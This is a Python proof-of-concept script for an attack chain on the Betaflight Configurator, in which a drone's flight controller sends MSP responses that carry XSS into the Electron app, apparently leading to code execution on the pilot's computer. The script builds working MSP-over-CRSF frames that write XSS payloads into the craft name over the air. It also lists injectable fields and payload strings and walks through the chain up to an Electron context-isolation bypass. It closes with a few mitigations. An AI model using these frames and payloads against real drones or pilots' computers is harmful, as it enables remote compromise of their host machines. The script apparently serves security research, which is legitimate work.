#!/usr/bin/env python3
"""
Betaflight Configurator MSP→XSS→RCE Chain PoC

Demonstrates how a compromised flight controller (via DFU firmware
modification or MSP-over-ELRS injection) can craft MSP responses that
trigger XSS in the Betaflight Configurator Electron app, leading to
host-machine RCE via context-isolation bypass.

Attack chain:
  1. MODIFY: Attacker modifies FC firmware via DFU (bench access) or
     injects persistent config via MSP-over-ELRS OTA
  2. RESPOND: Modified FC sends crafted MSP responses containing XSS
     payloads in string fields (board name, version, craft name, etc.)
  3. EXECUTE: Configurator renders the response in its Electron UI
     without proper sanitization → XSS in renderer process
  4. ESCALATE: CVE-2026-70601 context-isolation bypass → from renderer
     XSS to Node.js code execution on the host machine

Affected fields (MSP responses with string content rendered in UI):
  - MSP_BOARD_INFO (4): board identifier, board name
  - MSP_FC_VERSION (3): firmware version string
  - MSP_BUILD_INFO (5): build date/time string
  - MSP_NAME (10): craft name (user-configurable!)
  - MSP_STATUS_EX (150): debug/warning strings
  - MSP_BOXNAMES (116): mode/flag names
  - MSP_PIDNAMES (112): PID controller names

The craft name (MSP_NAME) is the easiest vector because:
  - It's user-configurable via MSP_SET_NAME (no firmware modification)
  - It's displayed prominently in the Configurator header
  - It's stored in EEPROM and persists across reboots
  - MSP_SET_NAME is NOT ARMED-gated (writable via OTA during flight)
  - Max length: 16 bytes in Betaflight 4.4.2

Usage:
  # Show all XSS payload candidates
  python3 bf-configurator-msp-xss.py --scenario all

  # Generate MSP_SET_NAME payload with XSS
  python3 bf-configurator-msp-xss.py --scenario craft-name-xss

  # Show full attack chain analysis
  python3 bf-configurator-msp-xss.py --scenario chain-analysis

For authorized security research and CTF use only.
"""

import argparse
import json
import os
import struct
import sys

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# MSP constants
# ---------------------------------------------------------------------------

MSP_NAME = 10
MSP_SET_NAME = 11
MSP_FC_VERSION = 3
MSP_BOARD_INFO = 4
MSP_BUILD_INFO = 5
MSP_BOXNAMES = 116
MSP_PIDNAMES = 112
MSP_STATUS_EX = 150

# CRSF constants
CRSF_ADDRESS_FC = 0xC8
CRSF_FRAMETYPE_MSP_REQ = 0x7A
CRSF_ADDRESS_TX = 0xEA

BF_CRAFT_NAME_MAX = 16


def crc8_dvbs2(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 0x80:
                crc = ((crc << 1) ^ 0xD5) & 0xFF
            else:
                crc = (crc << 1) & 0xFF
    return crc


def msp_v1_checksum(cmd: int, payload: bytes) -> int:
    cs = len(payload) ^ cmd
    for b in payload:
        cs ^= b
    return cs & 0xFF


def build_msp_over_crsf(cmd: int, payload: bytes = b"") -> bytes:
    flags = 0x00
    msp_crc = msp_v1_checksum(cmd, payload)
    msp_data = bytes([flags, len(payload), cmd]) + payload + bytes([msp_crc])
    inner = bytes([CRSF_ADDRESS_TX]) + msp_data
    frame_len = len(inner) + 2
    frame = bytes([CRSF_ADDRESS_FC, frame_len, CRSF_FRAMETYPE_MSP_REQ])
    frame += inner
    crc = crc8_dvbs2(frame[2:])
    frame += bytes([crc])
    return frame


# ---------------------------------------------------------------------------
# XSS payload candidates (must fit in 16 bytes for craft name)
# ---------------------------------------------------------------------------

XSS_PAYLOADS = {
    "img_onerror": {
        "payload": '<img src=x onerror=alert(1)>',
        "fits_craft_name": False,
        "length": 28,
        "description": "Classic img onerror — too long for craft name, works in longer fields",
    },
    "svg_onload": {
        "payload": '<svg onload=alert(1)>',
        "fits_craft_name": False,
        "length": 21,
        "description": "SVG onload — slightly too long for 16-byte craft name",
    },
    "script_short": {
        "payload": '<script>alert(1)</script>',
        "fits_craft_name": False,
        "length": 25,
        "description": "Script tag — too long for craft name, but works in board name fields",
    },
    "craft_name_xss": {
        "payload": '<img/src=x/onerr',
        "fits_craft_name": True,
        "length": 16,
        "description": (
            "Truncated XSS — 16 bytes exactly. Won't execute standalone, "
            "but demonstrates that HTML metacharacters pass through MSP "
            "without sanitization. If Configurator concatenates with other "
            "fields or renders in an attribute context, exploitation is possible."
        ),
    },
    "entity_probe": {
        "payload": '"><b>PWNED</b>',
        "fits_craft_name": True,
        "length": 14,
        "description": (
            "HTML injection probe — 14 bytes. If the craft name is rendered "
            "inside an HTML attribute (e.g., title=\"...\"), this breaks out "
            "and injects visible HTML. Proves lack of output encoding."
        ),
    },
    "attribute_break": {
        "payload": "' onclick=alert`",
        "fits_craft_name": True,
        "length": 16,
        "description": (
            "Attribute context XSS — 16 bytes. If rendered in a single-quoted "
            "HTML attribute, triggers on click. Template literal backtick "
            "avoids needing parentheses."
        ),
    },
}

# Fields in Betaflight Configurator that render MSP string data
INJECTABLE_FIELDS = [
    {
        "field": "Craft Name",
        "msp_read": MSP_NAME,
        "msp_write": MSP_SET_NAME,
        "max_length": 16,
        "writable_ota": True,
        "armed_check": False,
        "ui_location": "Header bar, top of every page",
        "render_context": "innerHTML or textContent (varies by Configurator version)",
        "risk": "HIGH — writable via OTA, no ARMED check, displayed on every page",
    },
    {
        "field": "Board Name",
        "msp_read": MSP_BOARD_INFO,
        "msp_write": None,
        "max_length": 64,
        "writable_ota": False,
        "armed_check": "N/A (read-only)",
        "ui_location": "Setup page, status bar",
        "render_context": "innerHTML",
        "risk": "MEDIUM — requires firmware modification, but longer payload space",
    },
    {
        "field": "Mode/Flag Names",
        "msp_read": MSP_BOXNAMES,
        "msp_write": None,
        "max_length": 512,
        "writable_ota": False,
        "armed_check": "N/A (read-only)",
        "ui_location": "Modes tab, dropdown labels",
        "render_context": "innerHTML in dropdown options",
        "risk": "LOW — requires firmware modification, but very large payload space",
    },
]


def scenario_craft_name_xss() -> dict:
    """Generate MSP_SET_NAME with XSS probe payload."""
    results = {}
    for name, info in XSS_PAYLOADS.items():
        payload_bytes = info["payload"].encode("utf-8")
        if len(payload_bytes) > BF_CRAFT_NAME_MAX:
            payload_bytes = payload_bytes[:BF_CRAFT_NAME_MAX]

        crsf = build_msp_over_crsf(MSP_SET_NAME, payload_bytes)
        results[name] = {
            **info,
            "payload_bytes": payload_bytes.hex(),
            "payload_length": len(payload_bytes),
            "crsf_frame": crsf.hex(),
            "crsf_length": len(crsf),
            "fits_16_bytes": len(info["payload"].encode()) <= BF_CRAFT_NAME_MAX,
        }

    return {
        "name": "Craft Name XSS Injection",
        "description": (
            "MSP_SET_NAME (cmd 11) sets the drone's craft name, stored in "
            "EEPROM and displayed in the Betaflight Configurator header. "
            "This command has NO ARMED check and is writable via OTA "
            "(MSP-over-ELRS). The craft name is limited to 16 bytes in "
            "BF 4.4.2, constraining the XSS payload size."
        ),
        "msp_cmd": MSP_SET_NAME,
        "max_length": BF_CRAFT_NAME_MAX,
        "payloads": results,
    }


def scenario_chain_analysis() -> dict:
    """Full attack chain analysis: DFU→MSP→XSS→RCE."""
    return {
        "name": "Betaflight Configurator Attack Chain Analysis",
        "chain": [
            {
                "step": 1,
                "name": "Compromise FC",
                "methods": [
                    {
                        "method": "OTA MSP_SET_NAME",
                        "description": (
                            "Via ELRS session hijack: send MSP_SET_NAME with "
                            "XSS payload. Stored in EEPROM, persists across reboots. "
                            "No bench access needed."
                        ),
                        "difficulty": "Medium (requires ELRS pairing)",
                        "persistence": "Survives reboot (EEPROM)",
                        "payload_limit": "16 bytes",
                    },
                    {
                        "method": "DFU firmware modification",
                        "description": (
                            "Via USB DFU with bench access: modify the firmware "
                            "binary to return crafted MSP responses. Board name, "
                            "mode names, and version strings can carry larger payloads. "
                            "STM32F411 at RDP Level 0 makes firmware extraction trivial."
                        ),
                        "difficulty": "Low (physical USB access + RDP Level 0)",
                        "persistence": "Survives factory reset",
                        "payload_limit": "64+ bytes (field dependent)",
                    },
                ],
            },
            {
                "step": 2,
                "name": "Configurator renders MSP response",
                "description": (
                    "When the pilot connects their drone to Betaflight Configurator "
                    "(an Electron app), it reads MSP_NAME, MSP_BOARD_INFO, and other "
                    "info commands. The responses are rendered in the UI. If the "
                    "Configurator uses innerHTML without sanitization, injected HTML "
                    "executes in the Electron renderer process."
                ),
                "trigger": "Pilot connects drone via USB or WiFi",
                "prerequisites": "Pilot uses Betaflight Configurator (standard workflow)",
            },
            {
                "step": 3,
                "name": "XSS in Electron renderer",
                "description": (
                    "Injected JavaScript executes in the Chromium renderer process. "
                    "In older Configurator versions with nodeIntegration enabled, "
                    "this gives immediate Node.js access. In newer versions, "
                    "context isolation must be bypassed."
                ),
                "impact": "Code execution in renderer process",
            },
            {
                "step": 4,
                "name": "Context isolation bypass → RCE",
                "description": (
                    "CVE-2026-70601 (Electron context-isolation bypass) allows "
                    "escalation from renderer XSS to full Node.js execution. "
                    "The attacker gains shell access on the pilot's computer "
                    "with the pilot's user privileges."
                ),
                "cve": "CVE-2026-70601",
                "impact": "Full host-machine RCE with pilot's user privileges",
                "note": (
                    "This CVE is in the Electron framework used by Configurator. "
                    "Even if BF Configurator sanitizes MSP strings, the same "
                    "attack works via DFU-modified firmware returning crafted "
                    "binary MSP responses that bypass string sanitization."
                ),
            },
        ],
        "assessment": (
            "This chain bridges the gap between drone compromise and host "
            "compromise. The pilot's own standard workflow (connecting the "
            "drone to configure it) becomes the trigger. The attack is "
            "invisible — the pilot sees their drone's name in the Configurator "
            "and has no reason to suspect the MSP response is malicious.\n\n"
            "The OTA vector (MSP_SET_NAME via ELRS) is particularly concerning "
            "because it requires no physical access: an attacker who has "
            "cracked the binding phrase can remotely plant the XSS payload, "
            "then wait for the pilot to plug in their drone at home.\n\n"
            "Mitigations:\n"
            "  - Configurator should sanitize all MSP string fields (CSP + "
            "    output encoding)\n"
            "  - Update Electron to patch CVE-2026-70601\n"
            "  - Validate MSP string fields contain only printable ASCII\n"
            "  - Add integrity checks on MSP_NAME / craft name changes"
        ),
    }


def scenario_injectable_fields() -> dict:
    """Analyze all injectable MSP string fields."""
    return {
        "name": "Injectable MSP String Fields",
        "description": (
            "MSP responses containing string data that Betaflight Configurator "
            "renders in the UI. Each field is a potential XSS injection point."
        ),
        "fields": INJECTABLE_FIELDS,
    }


SCENARIOS = {
    "craft-name-xss": scenario_craft_name_xss,
    "chain-analysis": scenario_chain_analysis,
    "injectable-fields": scenario_injectable_fields,
}


def print_scenario(scenario: dict):
    print(f"\n{'=' * 70}")
    print(f"Scenario: {scenario['name']}")
    print(f"{'=' * 70}")

    if "description" in scenario:
        print(f"\n  {scenario['description']}")

    if "payloads" in scenario:
        print(f"\n  MSP_SET_NAME (cmd {scenario['msp_cmd']}) — max {scenario['max_length']} bytes")
        for name, info in scenario["payloads"].items():
            fits = "YES" if info["fits_16_bytes"] else "NO (truncated)"
            print(f"\n  Payload: {name}")
            print(f"    String:  {info['payload']!r}")
            print(f"    Length:  {info['payload_length']} bytes (fits: {fits})")
            print(f"    Hex:     {info['payload_bytes']}")
            print(f"    CRSF:    {info['crsf_frame']}")
            print(f"    {info['description']}")

    if "chain" in scenario:
        for step_info in scenario["chain"]:
            print(f"\n  Step {step_info['step']}: {step_info['name']}")
            if "description" in step_info:
                print(f"    {step_info['description']}")
            if "methods" in step_info:
                for m in step_info["methods"]:
                    print(f"\n    Method: {m['method']}")
                    print(f"      {m['description']}")
                    print(f"      Difficulty: {m['difficulty']}")
                    print(f"      Persistence: {m['persistence']}")
                    print(f"      Payload limit: {m['payload_limit']}")
            if "cve" in step_info:
                print(f"    CVE: {step_info['cve']}")
            if "impact" in step_info:
                print(f"    Impact: {step_info['impact']}")

    if "fields" in scenario:
        for f in scenario["fields"]:
            print(f"\n  Field: {f['field']}")
            print(f"    MSP read:  {f['msp_read']}, write: {f['msp_write']}")
            print(f"    Max length: {f['max_length']} bytes")
            print(f"    OTA writable: {f['writable_ota']}")
            print(f"    ARMED check: {f['armed_check']}")
            print(f"    UI location: {f['ui_location']}")
            print(f"    Risk: {f['risk']}")

    if "assessment" in scenario:
        print(f"\n  {'=' * 60}")
        print("  ASSESSMENT")
        print(f"  {'=' * 60}")
        for line in scenario["assessment"].split("\n"):
            print(f"  {line}")


def main():
    parser = argparse.ArgumentParser(
        description="Betaflight Configurator MSP→XSS→RCE Chain PoC"
    )
    parser.add_argument(
        "--scenario", required=True,
        choices=list(SCENARIOS.keys()) + ["all"],
        help="Attack scenario to analyze",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    args = parser.parse_args()

    print("Betaflight Configurator MSP→XSS→RCE Chain PoC")
    print("Mode: ANALYSIS AND FRAME CONSTRUCTION ONLY")
    print()

    results = {"scenarios": {}}

    if args.scenario == "all":
        for name, fn in SCENARIOS.items():
            s = fn()
            print_scenario(s)
            results["scenarios"][name] = s
    else:
        s = SCENARIOS[args.scenario]()
        print_scenario(s)
        results["scenarios"][args.scenario] = s

    if args.output:
        def sanitize(obj):
            if isinstance(obj, bytes):
                return obj.hex()
            if isinstance(obj, dict):
                return {k: sanitize(v) for k, v in obj.items()}
            if isinstance(obj, list):
                return [sanitize(v) for v in obj]
            return obj

        with open(args.output, "w") as f:
            json.dump(sanitize(results), f, indent=2)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
